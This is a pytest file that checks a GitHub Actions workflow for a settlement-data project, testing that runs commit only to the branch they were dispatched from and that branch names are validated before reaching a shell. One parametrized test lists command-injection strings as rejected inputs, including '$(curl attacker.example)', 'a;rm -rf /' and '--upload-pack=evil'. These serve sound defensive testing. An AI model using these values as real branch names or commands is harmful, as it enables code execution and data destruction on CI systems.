#!/usr/bin/env python3
"""
tests/test_clv_update_branch_targeting.py
=========================================
WAVE 0.05. Guards on the ONE property that makes clv-update.yml safe to
rehearse: a run persists only to the ref it was dispatched from, and never
silently to the default branch.

The defect these lock closed: clv-update.yml called git_data_commit.py with
no --branch, which defaults to 'main' and pushes `HEAD:<branch>` -- while
actions/checkout with no `ref:` checks out github.ref. So a feature-branch
rehearsal computed on the feature branch and published to main. There was
consequently no safe way to test the settlement chain end to end, which is a
direct contributor to audit CR-2 reaching production.

These assert against the REAL workflow YAML and the REAL resolver, never a
hand-copied duplicate.
"""

import os
import re
import subprocess
import sys

import pytest

yaml = pytest.importorskip("yaml")

_HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(_HERE)
WORKFLOW = os.path.join(ROOT, ".github", "workflows", "clv-update.yml")

sys.path.insert(0, os.path.join(ROOT, "scripts", "ci"))
from resolve_commit_branch import (  # noqa: E402
    BranchResolutionError,
    resolve_target_branch,
    validate_branch_name,
)

DEFAULT = "main"


def _steps():
    with open(WORKFLOW) as handle:
        (job,) = yaml.safe_load(handle)["jobs"].values()
    return job["steps"]


def _step(name):
    for step in _steps():
        if (step.get("name") or "") == name:
            return step
    raise AssertionError("no step named %r" % name)


def _resolver_subprocess(env_overrides):
    """Runs the real resolver as the workflow runs it: a separate process
    fed only environment variables."""
    env = {k: v for k, v in os.environ.items() if not k.startswith("GITHUB_")}
    env.pop("DEFAULT_BRANCH", None)
    env.update(env_overrides)
    return subprocess.run(
        [sys.executable, os.path.join(ROOT, "scripts", "ci", "resolve_commit_branch.py")],
        cwd=ROOT, env=env, capture_output=True, text=True, timeout=60)


# ── 1. Scheduled production runs are unchanged ───────────────────────────────

def test_scheduled_run_still_targets_the_default_branch():
    """
    The production path must not move. A nightly schedule fires on the
    default branch and must keep writing there, exactly as before Wave 0.05.
    """
    assert resolve_target_branch("schedule", DEFAULT, "branch", DEFAULT) == DEFAULT


def test_scheduled_run_targets_a_non_main_default_branch_too():
    """The default branch is read from GitHub context, never hard-coded."""
    assert resolve_target_branch("schedule", "trunk", "branch", "trunk") == "trunk"


# ── 2. Dispatch from a feature branch targets that feature branch ────────────

def test_workflow_dispatch_on_a_feature_branch_targets_that_branch():
    branch = "claude/wave-0-05-clv-rehearsal-path"
    assert resolve_target_branch("workflow_dispatch", branch, "branch", DEFAULT) == branch


def test_workflow_dispatch_on_main_may_still_write_to_main():
    """Requirement C: dispatching from main is intentional production use."""
    assert resolve_target_branch("workflow_dispatch", DEFAULT, "branch", DEFAULT) == DEFAULT


# ── 3. A feature-branch rehearsal can never write to main ────────────────────

@pytest.mark.parametrize("branch", [
    "claude/wave-0-05-clv-rehearsal-path",
    "rehearsal/2026-09-08",
    "feature/x",
    "dependabot/pip/requests-2.32.0",
])
def test_feature_branch_rehearsal_never_resolves_to_the_default_branch(branch):
    """
    THE safety property. For any feature branch, the resolved target is that
    branch and never the default branch -- so a rehearsal's settlement output
    cannot reach production.
    """
    resolved = resolve_target_branch("workflow_dispatch", branch, "branch", DEFAULT)
    assert resolved == branch
    assert resolved != DEFAULT


def test_the_resolver_is_what_the_commit_step_actually_uses():
    """
    A correct resolver is worthless if the commit step ignores it. Pin the
    wiring: the commit step must pass --branch, and it must pass the
    resolver step's output rather than a literal.
    """
    commit = _step("Commit all updates")["run"]
    assert "--branch" in commit, (
        "the commit step must pass an explicit --branch; without it "
        "git_data_commit.py defaults to 'main' and a rehearsal publishes to "
        "production")
    assert '--branch "${{ steps.target.outputs.branch }}"' in commit, (
        "the commit step must use the resolved target branch, not a literal")
    assert "--branch main" not in commit
    assert "--branch \"main\"" not in commit


def test_the_resolver_step_exists_and_runs_before_any_computation():
    """
    An unsafe target must fail the job before settlement is computed, not
    after -- otherwise a rejected run still burns API quota and produces
    output it cannot persist.
    """
    names = [(s.get("name") or "") for s in _steps()]
    assert "Resolve commit target branch" in names
    target_index = names.index("Resolve commit target branch")
    for later in ("Run CLV update (settlement + Pinnacle CLV)", "Commit all updates"):
        assert names.index(later) > target_index, (
            "%r must run after the target-branch resolver" % later)


# ── 4. Ambiguity fails closed instead of falling back to main ────────────────

@pytest.mark.parametrize("event,ref,ref_type,default,why", [
    (None, "x", "branch", DEFAULT, "missing event"),
    ("", "x", "branch", DEFAULT, "empty event"),
    ("pull_request", "x", "branch", DEFAULT, "unsupported event"),
    ("workflow_run", "x", "branch", DEFAULT, "unsupported event"),
    ("workflow_dispatch", "x", "tag", DEFAULT, "ref is a tag, not a branch"),
    ("workflow_dispatch", "x", None, DEFAULT, "missing ref type"),
    ("workflow_dispatch", None, "branch", DEFAULT, "missing ref name"),
    ("workflow_dispatch", "", "branch", DEFAULT, "empty ref name"),
    ("workflow_dispatch", "x", "branch", None, "missing default branch"),
    ("schedule", "feature/x", "branch", DEFAULT, "schedule off the default branch"),
])
def test_ambiguous_state_raises_instead_of_defaulting_to_main(event, ref, ref_type, default, why):
    with pytest.raises(BranchResolutionError):
        resolve_target_branch(event, ref, ref_type, default)


@pytest.mark.parametrize("bad", [
    "$(curl attacker.example)",      # command substitution
    "`id`",                          # backtick substitution
    "a;rm -rf /",                    # command separator
    "a|tee /tmp/x",                  # pipe
    "a&b",                           # background
    "a b",                           # whitespace
    "a\nb",                          # newline
    "--upload-pack=evil",            # parsed as a git option
    "-x",                            # parsed as an option
    "/leading",
    "trailing/",
    "a..b",
    "a//b",
    "refs.lock",
    "HEAD",
    "a'b",
    'a"b',
    "a>b",
])
def test_malformed_or_injecting_branch_names_are_rejected(bad):
    """
    Git permits `$`, backticks and `;` in ref names, so a resolved name that
    reaches a shell must be constrained independently of git's own rules.
    """
    with pytest.raises(BranchResolutionError):
        validate_branch_name(bad)
    with pytest.raises(BranchResolutionError):
        resolve_target_branch("workflow_dispatch", bad, "branch", DEFAULT)


def test_the_resolver_process_exits_nonzero_and_prints_nothing_usable_on_failure():
    """
    The workflow does `BRANCH="$(python3 ... )"` under `set -euo pipefail`.
    Prove a rejected state exits non-zero AND emits no branch on stdout, so
    it cannot degrade into an empty or attacker-chosen --branch value.
    """
    proc = _resolver_subprocess({
        "GITHUB_EVENT_NAME": "workflow_dispatch",
        "GITHUB_REF_NAME": "$(id)",
        "GITHUB_REF_TYPE": "branch",
        "DEFAULT_BRANCH": DEFAULT,
    })
    assert proc.returncode != 0
    assert proc.stdout.strip() == ""
    assert "main" not in proc.stdout


def test_the_resolver_process_emits_exactly_the_branch_on_success():
    branch = "claude/wave-0-05-clv-rehearsal-path"
    proc = _resolver_subprocess({
        "GITHUB_EVENT_NAME": "workflow_dispatch",
        "GITHUB_REF_NAME": branch,
        "GITHUB_REF_TYPE": "branch",
        "DEFAULT_BRANCH": DEFAULT,
    })
    assert proc.returncode == 0, proc.stderr
    assert proc.stdout.strip() == branch


def test_resolver_step_passes_context_by_env_not_by_interpolation():
    """
    ${{ github.ref_name }} interpolated into a `run:` body is substituted
    before the shell parses the script, so a branch named `$(...)` would
    execute. The context must arrive as environment variables.
    """
    step = _step("Resolve commit target branch")
    env = step.get("env") or {}
    assert env.get("GITHUB_REF_NAME") == "${{ github.ref_name }}"
    assert env.get("GITHUB_EVENT_NAME") == "${{ github.event_name }}"
    assert env.get("GITHUB_REF_TYPE") == "${{ github.ref_type }}"
    assert env.get("DEFAULT_BRANCH") == "${{ github.event.repository.default_branch }}"
    body = step["run"]
    assert "${{" not in body, (
        "the resolver step's script body must contain no ${{ }} expression; "
        "found one, which reintroduces the injection path")
    assert "set -euo pipefail" in body, (
        "a failed resolver must abort the step rather than continuing with an "
        "empty BRANCH")


def test_no_step_in_this_workflow_interpolates_a_ref_name_into_a_script_body():
    """Repo-wide-in-this-file guard against the injection pattern returning."""
    offenders = []
    for step in _steps():
        body = step.get("run") or ""
        for expr in ("github.ref_name", "github.head_ref", "github.ref}}"):
            if expr in body:
                offenders.append("%s :: %s" % (step.get("name"), expr))
    assert offenders == [], (
        "ref names must reach a script through env:, never ${{ }}: %r" % offenders)


# ── 5. The production commit file allow-list is unchanged ────────────────────

EXPECTED_ALLOW_LIST = (
    "bets.json BET_LOG.md data/identity_audit.json "
    "data/rule71_report.json data/clv_report.json"
)


def test_commit_file_allow_list_is_byte_for_byte_unchanged():
    """
    Wave 0.05 changes WHERE output goes, never WHAT is committed. This is the
    same literal string tests/test_risk_gate_review_parts_q_to_u.py pins.
    """
    commit = _step("Commit all updates")["run"]
    assert EXPECTED_ALLOW_LIST in commit
    assert "data/slate.json" not in commit, (
        "the restored, stale slate must still never be committed back")


def test_commit_step_still_persists_output_when_a_later_step_fails():
    """Wave 0's durability guarantee must survive this change."""
    assert _step("Commit all updates").get("if") == "always()"


# ── 6. No model / pricing / settlement semantics changed ─────────────────────

PROTECTED_FILES = [
    "scripts/build_market_ledger.py",
    "scripts/risk_gate.py",
    "scripts/write_pending_bets.py",
    "scripts/enrich_data.py",
    "scripts/merge_odds.py",
    "scripts/build_kalshi_registry.py",
    "config/rules.json",
    "api/slate.js",
    "lib/edgelab/settlement.py",
    "lib/edgelab/kalshi_fees.py",
    "lib/edgelab/clv_convention.py",
    "lib/research/market_taxonomy.py",
    "clv_update.py",
    "scripts/ci/git_data_commit.py",
]


def test_wave_0_05_touches_no_model_pricing_or_settlement_file():
    """
    Static scope guard. Wave 0.05 is workflow branch targeting plus a new
    resolver module; it must not have edited any decision-surface file.
    Compares against the merge-base with the default branch so scheduled data
    commits on main cannot make this flap.
    """
    base = subprocess.run(
        ["git", "merge-base", "HEAD", "origin/main"],
        cwd=ROOT, capture_output=True, text=True)
    if base.returncode != 0 or not base.stdout.strip():
        pytest.skip("no origin/main merge-base available in this checkout")
    changed = subprocess.run(
        ["git", "diff", "--name-only", base.stdout.strip(), "--"] + PROTECTED_FILES,
        cwd=ROOT, capture_output=True, text=True)
    if changed.returncode != 0:
        pytest.skip("git diff unavailable in this checkout")
    assert changed.stdout.split() == [], (
        "Wave 0.05 must not modify any model/pricing/settlement file; changed: %r"
        % changed.stdout.split())


def test_the_resolver_module_contains_no_betting_or_model_logic():
    """
    The resolver decides a git branch and nothing else -- it must never grow
    a dependency on, or a reference to, the decision surface.
    """
    with open(os.path.join(ROOT, "scripts", "ci", "resolve_commit_branch.py")) as handle:
        source = handle.read()
    body = source.split('"""', 2)[-1]  # skip the module docstring's prose
    for forbidden in ("bets.json", "modelProb", "kelly", "stake", "edge",
                      "probability", "settle", "price", "import lib",
                      "build_market_ledger"):
        assert forbidden not in body, (
            "resolve_commit_branch.py references %r; it must decide a branch "
            "and nothing else" % forbidden)


def test_workflow_still_parses_and_keeps_its_production_trigger_shape():
    with open(WORKFLOW) as handle:
        workflow = yaml.safe_load(handle)
    on = workflow.get("on") or workflow.get(True)
    assert "schedule" in on, "the nightly production schedule must remain"
    assert on["schedule"] == [{"cron": "0 6 * * *"}], (
        "Wave 0.05 must not change when production runs")
    assert "workflow_dispatch" in on
    assert set((on["workflow_dispatch"].get("inputs") or {})) == {"date", "skip_settlement"}, (
        "Wave 0.05 adds no new dispatch input -- the target branch is derived "
        "from the ref, never supplied by the caller")
